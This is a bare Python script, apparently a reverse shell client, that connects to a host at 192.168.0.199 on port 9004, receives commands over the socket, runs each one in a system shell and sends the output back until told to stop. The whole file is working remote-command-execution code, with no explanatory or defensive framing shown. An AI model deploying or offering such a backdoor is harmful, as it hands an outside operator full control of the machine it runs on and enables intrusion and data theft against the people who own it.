import socket
import subprocess

sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.connect(("192.168.0.199",9004))

sock.send(b'ACK')
request=''
while request != b'oblock':
    request = sock.recv(1024)
    print("Client received this command: " + request.decode())
    try:
        if request!=b'oblock':
            command = subprocess.run(request.decode(),shell=True,capture_output=True, check=True)
    except subprocess.CalledProcessError:
        sock.send(f"The command {request.decode()} raised CalledProcessError.".encode())
        continue
    sock.send(command.stdout)
sock.recv(4096)
sock.send(b'bye!')
print("Pulling out.")
sock.close()